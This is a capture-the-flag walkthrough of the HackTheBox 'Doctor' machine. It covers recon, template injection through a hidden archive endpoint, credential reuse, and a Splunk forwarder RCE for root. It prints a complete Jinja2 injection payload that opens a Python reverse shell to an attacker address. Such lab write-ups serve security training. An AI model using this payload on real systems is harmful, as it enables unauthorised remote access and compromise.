# Doctor

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (75) (5) (1).png" alt=""><figcaption></figcaption></figure>

### Doctors.htb

The website revealed a basic corporate page:

<figure><img src="../../../.gitbook/assets/image (25) (1) (3).png" alt=""><figcaption></figcaption></figure>

There was nothing interesting, until I added `doctors.htb` to the `/etc/hosts` file (as per standard HTB practice) and visited that site.

<figure><img src="../../../.gitbook/assets/image (40) (2) (2).png" alt=""><figcaption></figcaption></figure>

Here, we can create an account and test this service. When logged in, we can see a few functions.

<figure><img src="../../../.gitbook/assets/image (123) (1).png" alt=""><figcaption></figcaption></figure>

When examining the page source, we can find an `/archive` endpoint.&#x20;

```markup
 <div class="navbar-nav mr-auto">
              <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">
```

When visiting it, it returns nothing but the **posts that we have made**.&#x20;

### SSTI in Posts

Initially, I tested other vulnerabilities like SSTI on the username and the message posting functions but it didn't return any positives.

<figure><img src="../../../.gitbook/assets/image (21) (1) (5).png" alt=""><figcaption></figcaption></figure>

When I visited the `/archive` endpoint, we would actually see that it works!

<figure><img src="../../../.gitbook/assets/image (2) (6) (3) (2).png" alt=""><figcaption></figcaption></figure>

For SSTI, we can follow this table on HackTricks to determine which framework is being used.

<figure><img src="../../../.gitbook/assets/image (12) (7) (1).png" alt=""><figcaption></figcaption></figure>

For this specific box, we can determine that it's Jinja2 or Twig. On PayloadAllTheThings, there's a payload that works in spawning a reverse shell.

{% code overflow="wrap" %}
```
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.6\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% endraw %}
```
{% endcode %}

When we submit this as a message, it would spawn a reverse shell.

<figure><img src="../../../.gitbook/assets/image (18) (5).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Shaun Credentials

I ran LinPEAS to enumerate all files for me, it found a credential for me.

<figure><img src="../../../.gitbook/assets/image (128) (1).png" alt=""><figcaption></figcaption></figure>

When checking for other users, there was only the user `shaun`.

<figure><img src="../../../.gitbook/assets/image (23) (1) (2).png" alt=""><figcaption></figcaption></figure>

We can try using `su` with this credential, and it works.

<figure><img src="../../../.gitbook/assets/image (124) (2).png" alt=""><figcaption></figcaption></figure>

### Splunk RCE

I checked the `/opt` directory, and found that there were some `splunkforwarder` related files within it.

<figure><img src="../../../.gitbook/assets/image (126) (3) (1).png" alt=""><figcaption></figcaption></figure>

Normally, Splunk runs on port 8089, and we did find that port open on the machine earlier. Furthermore, this version of Splunk is vulnerable to an RCE exploit called SplunkWhisperer.

{% embed url="https://github.com/cnotin/SplunkWhisperer2" %}

We can easily run the exploit to give us a reverse shell as root.&#x20;

<figure><img src="../../../.gitbook/assets/image (37) (3) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (42) (6).png" alt=""><figcaption></figcaption></figure>
